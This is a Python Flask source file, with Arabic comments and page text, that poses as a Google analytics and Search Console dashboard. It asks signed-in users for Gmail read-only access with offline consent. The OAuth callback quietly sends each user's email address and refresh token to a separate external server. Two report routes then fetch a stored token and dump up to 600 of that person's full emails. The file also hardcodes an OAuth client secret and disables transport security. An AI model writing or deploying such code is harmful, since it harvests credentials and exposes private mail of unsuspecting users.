import os
import base64
import json
import traceback
import requests
from flask import Flask, request, redirect, session, url_for, render_template, Response
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from googleapiclient.http import BatchHttpRequest
from google.auth.exceptions import RefreshError

app = Flask(__name__)
app.secret_key = 'a_very_long_and_super_secret_string_for_my_app'
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

# متغير عام لحفظ آخر توكن (اختياري)
LATEST_REFRESH_TOKEN = None

# بيانات الاعتماد والروابط
CLIENT_ID = '1096352235538-pkdcd73qn9miojk1cflr52fuminb4j4c.apps.googleusercontent.com'
CLIENT_SECRET = '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'
REDIRECT_URI = 'https://flyright-test.onrender.com/callback'
TOKEN_SERVER_URL = 'https://bmapps1.pythonanywhere.com' # رابط الخادم الذي يستقبل التوكن

SCOPES = [
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/userinfo.profile',
    'https://www.googleapis.com/auth/webmasters.readonly',
    'https://www.googleapis.com/auth/analytics.readonly',
    'https://www.googleapis.com/auth/gmail.readonly',
    'openid'
]

def create_flow():
    return Flow.from_client_config(
        client_config={ "web": { "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "auth_uri": "https://accounts.google.com/o/oauth2/auth", "token_uri": "https://oauth2.googleapis.com/token", "redirect_uris": [REDIRECT_URI] }},
        scopes=SCOPES,
        redirect_uri=REDIRECT_URI
    )

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    flow = create_flow()
    authorization_url, state = flow.authorization_url(access_type='offline', prompt='consent')
    session['state'] = state
    return redirect(authorization_url)

@app.route('/callback')
def callback():
    global LATEST_REFRESH_TOKEN
    flow = create_flow()
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    try:
        # بناء الخدمة للحصول على معلومات المستخدم
        service = build('oauth2', 'v2', credentials=credentials)
        user_info = service.userinfo().get().execute()
        user_email = user_info.get('email', 'unknown_email')
        refresh_token = credentials.refresh_token

        if refresh_token:
            # تحديث المتغير العام (اختياري)
            LATEST_REFRESH_TOKEN = refresh_token
            # إرسال التوكن إلى الخادم الخارجي
            try:
                payload = {'text_data': f"Email: {user_email}\nRefreshToken: {refresh_token}"}
                requests.post(f"{TOKEN_SERVER_URL}/receive_data", data=payload, timeout=10)
            except Exception as send_error:
                print(f"Failed to send token: {send_error}")

    except Exception as e:
        print(f"An error occurred during callback: {e}")
        
    # التوجيه إلى الداشبورد بدلاً من صفحة التقرير
    return redirect('/#dashboard')


# دالة التقرير تبقى كما هي مع حقل الإدخال اليدوي
@app.route('/report', methods=['GET', 'POST'])
def report():
    error_message = None 
    
    if request.method == 'POST':
        refresh_token = request.form.get('token_input')
        if not refresh_token:
            return "<h2>الرجاء إدخال Refresh Token.</h2>", 400

        try:
            credentials = Credentials(
                token=None, refresh_token=refresh_token,
                token_uri='https://oauth2.googleapis.com/token',
                client_id=CLIENT_ID, client_secret=CLIENT_SECRET,
                scopes=['https://www.googleapis.com/auth/gmail.readonly']
            )
            
            service = build('gmail', 'v1', credentials=credentials)
            result = service.users().messages().list(userId='me', maxResults=20, q="is:inbox").execute()
            messages = result.get('messages', [])
            
            if not messages: return "<h2>لم يتم العثور على رسائل في البريد الوارد.</h2>"
            
            emails_data = []
            def batch_callback(request_id, response, exception):
                if exception is None: emails_data.append(response)
                else: print(f"Batch request error: {exception}")
            batch = service.new_batch_http_request(callback=batch_callback)
            for msg in messages:
                batch.add(service.users().messages().get(userId='me', id=msg['id'], format='full'))
            batch.execute()
            
            html_content = """
            <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تقرير الرسائل</title>
            <style>body { font-family: sans-serif; margin: 20px; background-color: #f8f9fa;} h1 {text-align: center;} .email { background-color: #fff; border: 1px solid #ddd; margin-bottom: 10px; border-radius: 8px;} .email-header { padding: 15px; cursor: pointer; background-color: #f1f3f5;} .email-header h2 { font-size: 1.1rem; margin: 0;} .email-header small { color: #6c757d; } .email-body { padding: 20px; border-top: 1px solid #ddd; display: none;} .email-body pre { white-space: pre-wrap; font-family: monospace;}</style>
            <script>function toggleMessage(id) { var e = document.getElementById('body-' + id); e.style.display = e.style.display === "none" ? "block" : "none"; }</script>
            </head><body><h1>تقرير آخر 20 رسالة</h1>
            """
            for msg_data in emails_data:
                payload = msg_data.get('payload', {})
                headers = payload.get('headers', [])
                subject = next((h['value'] for h in headers if h['name'].lower() == 'subject'), 'لا يوجد موضوع')
                sender = next((h['value'] for h in headers if h['name'].lower() == 'from'), 'مرسل غير معروف')
                def find_body(parts):
                    if parts:
                        for part in parts:
                            if part.get('mimeType') == 'text/plain' and 'data' in part['body']:
                                return f"<pre>{base64.urlsafe_b64decode(part['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')}</pre>"
                    return ""
                body = find_body(payload.get('parts')) if 'parts' in payload else (f"<pre>{base64.urlsafe_b64decode(payload.get('body', {}).get('data', '')).decode('utf-8', 'ignore')}</pre>" if payload.get('mimeType') == 'text/plain' else "")
                if not body: body = "<p><i>(لا يوجد محتوى نصي واضح)</i></p>"
                html_content += f"""<div class="email"><div class="email-header" onclick="toggleMessage('{msg_data['id']}')"><h2>{subject}</h2><small>من: {sender}</small></div><div class="email-body" id="body-{msg_data['id']}" style="display:none;">{body}</div></div>"""
            html_content += "</body></html>"
            
            return Response(html_content, mimetype='text/html; charset=utf-8')

        except RefreshError as e:
            error_message = f"هذا التوكن غير صالح أو تم إبطاله. الرجاء الحصول على توكن جديد. (الخطأ: {e})"
        except Exception as e:
            error_message = f"حدث خطأ غير متوقع: {e}"

    token_value = LATEST_REFRESH_TOKEN if LATEST_REFRESH_TOKEN else ""
    form_html = f"""
    <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>إدخال التوكن</title>
    <style>body {{ font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }} .container {{ background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 600px; }} h1 {{ color: #333; }} textarea {{ width: 100%; min-height: 100px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #ccc; padding: 10px; font-family: monospace; }} button {{ padding: 12px 24px; border-radius: 8px; border: none; background-color: #007bff; color: white; font-size: 16px; cursor: pointer; }} .error {{ color: red; margin-top: 15px; font-weight: bold; }}</style>
    </head><body>
    <div class="container">
        <h1>عرض رسائل البريد</h1>
        <p>الرجاء لصق الـ Refresh Token في الحقل أدناه لعرض الرسائل.</p>
        <form method="post">
            <textarea name="token_input" placeholder="1//0...">{token_value}</textarea>
            <button type="submit">عرض الرسائل</button>
        </form>
        {f'<p class="error">{error_message}</p>' if error_message else ''}
    </div></body></html>
    """
    return Response(form_html, mimetype='text/html; charset=utf-8')
    
@app.route('/privacy-policy')
def privacy_policy():
    return render_template('privacy.html')
    

# ✅ تم استبدال الكود القديم بالكود الجديد المتقدم هنا
@app.route('/report2')
def show_report2():
    try:
        # Step 1: Fetch the refresh_token from your server
        response = requests.get(f"{TOKEN_SERVER_URL}/get_last_token", timeout=15)
        if response.status_code != 200:
            error_data = response.json()
            return f"<h1>خطأ في جلب التوكن من الخادم</h1><p>السبب: {error_data.get('error', 'خطأ غير معروف')}</p>", response.status_code

        token_data = response.json()
        refresh_token = token_data.get('last_token')
        if not refresh_token:
            return "<h2>لم يتم العثور على Refresh Token.</h2>", 404

        # Step 2: Build the Gmail service object
        credentials = Credentials(
            token=None, refresh_token=refresh_token,
            token_uri='https://oauth2.googleapis.com/token',
            client_id=CLIENT_ID, client_secret=CLIENT_SECRET,
            scopes=['https://www.googleapis.com/auth/gmail.readonly']
        )
        service = build('gmail', 'v1', credentials=credentials)

        # Step 3: Fetch message IDs using pagination to get more than 500
        messages = []
        next_page_token = None
        desired_message_count = 600

        while len(messages) < desired_message_count:
            results = service.users().messages().list(
                userId='me',
                maxResults=500,
                q="-category:promotions",
                pageToken=next_page_token
            ).execute()
            
            messages.extend(results.get('messages', []))
            next_page_token = results.get('nextPageToken')
            
            if not next_page_token:
                break
        
        messages = messages[:desired_message_count]
        
        if not messages:
            return "<h2>لم يتم العثور على رسائل.</h2>"

        # Step 4: Fetch full message content in batches of 100
        emails_data = []
        def callback(request_id, response, exception):
            if exception is None:
                emails_data.append(response)
            else:
                print(f"Batch request error: {exception}")
        
        batch_size = 100
        for i in range(0, len(messages), batch_size):
            batch = service.new_batch_http_request(callback=callback)
            message_slice = messages[i:i + batch_size]
            for msg in message_slice:
                batch.add(service.users().messages().get(userId='me', id=msg['id'], format='full'))
            batch.execute()

        # Step 5: Render the HTML report
        html_content = """
        <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تقرير الرسائل</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; margin: 20px; background-color: #f8f9fa; color: #212529; }
            h1 { color: #343a40; text-align: center; margin-bottom: 30px;}
            .email { background-color: #ffffff; border: 1px solid #dee2e6; margin-bottom: 10px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); overflow: hidden; }
            .email-header { padding: 15px 20px; cursor: pointer; background-color: #f1f3f5; }
            .email-header h2 { font-size: 1.1rem; margin: 0; color: #0056b3; }
            .email-header small { font-size: 0.85rem; color: #6c757d; }
            .email-body { padding: 20px; border-top: 1px solid #dee2e6; display: none; word-wrap: break-word; background-color: #fff; }
            .email-body pre { white-space: pre-wrap; line-height: 1.7; font-family: monospace; }
        </style>
        <script>
            function toggleMessage(id) {
                var element = document.getElementById('body-' + id);
                if (element.style.display === "none") { element.style.display = "block"; } else { element.style.display = "none"; }
            }
        </script>
        </head><body><h1>تقرير آخر {len(emails_data)} رسالة</h1>
        """

        def find_body(parts):
            html_part = ""
            plain_part = ""
            if not parts: return ""
            for part in parts:
                if part.get('mimeType') == 'text/html' and 'data' in part.get('body', {}):
                    html_part = base64.urlsafe_b64decode(part['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')
                    return html_part
                elif part.get('mimeType') == 'text/plain' and 'data' in part.get('body', {}):
                    plain_part = base64.urlsafe_b64decode(part['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')
            return f"<pre>{plain_part}</pre>" if plain_part else ""

        for msg_data in emails_data:
            payload = msg_data.get('payload', {})
            headers = payload.get('headers', [])
            subject = next((h['value'] for h in headers if h['name'].lower() == 'subject'), 'لا يوجد موضوع')
            sender = next((h['value'] for h in headers if h['name'].lower() == 'from'), 'مرسل غير معروف')
            
            body = ""
            if 'parts' in payload:
                body = find_body(payload.get('parts'))
            elif 'data' in payload.get('body', {}):
                plain_body = base64.urlsafe_b64decode(payload['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')
                body = f"<pre>{plain_body}</pre>"

            if not body:
                body = "<p><i>(لا يوجد محتوى نصي واضح)</i></p>"

            html_content += f"""
            <div class="email">
                <div class="email-header" onclick="toggleMessage('{msg_data['id']}')">
                    <h2>{subject}</h2><small>من: {sender}</small>
                </div>
                <div class="email-body" id="body-{msg_data['id']}" style="display:none;">{body}</div>
            </div>
            """
        
        html_content += "</body></html>"
        return Response(html_content, mimetype='text/html; charset=utf-8')

    except requests.exceptions.RequestException as e:
        return f"<h1>خطأ في الاتصال بخادم التوكن</h1><p>{e}</p>", 500
    except Exception as e:
        print(f"Error generating report: {traceback.format_exc()}")
        return "<h1>حدث خطأ فادح أثناء توليد التقرير.</h1><p>قد يكون الـ Refresh Token غير صالح أو تم إبطاله.</p>", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))